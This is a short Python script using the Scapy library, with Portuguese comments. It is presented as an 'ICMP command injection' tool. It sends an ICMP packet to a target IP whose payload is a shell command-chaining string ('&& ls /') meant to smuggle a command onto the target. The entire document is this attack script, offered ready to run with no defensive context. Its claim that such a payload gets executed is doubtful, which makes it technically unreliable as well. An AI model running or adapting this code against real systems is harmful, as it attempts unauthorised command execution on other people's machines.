from scapy.all import *

def injecao_comando_icmp(ip_alvo, comando):
    # Criação do pacote ICMP
    pacote_icmp = IP(dst=ip_alvo)/ICMP()
    # Concatenando o comando à carga útil do ICMP
    pacote_icmp[ICMP].payload = f'&& {comando}'
    # Envio do pacote
    send(pacote_icmp, verbose=False)

# Exemplo de uso
if __name__ == "__main__":
    # Defina o IP do alvo e o comando a ser injetado
    ip_alvo = "99.99.99.254"
    comando = "ls /"  # Comando para listar diretórios
    # Chamando a função para realizar a injeção de comando ICMP
    injecao_comando_icmp(ip_alvo, comando)
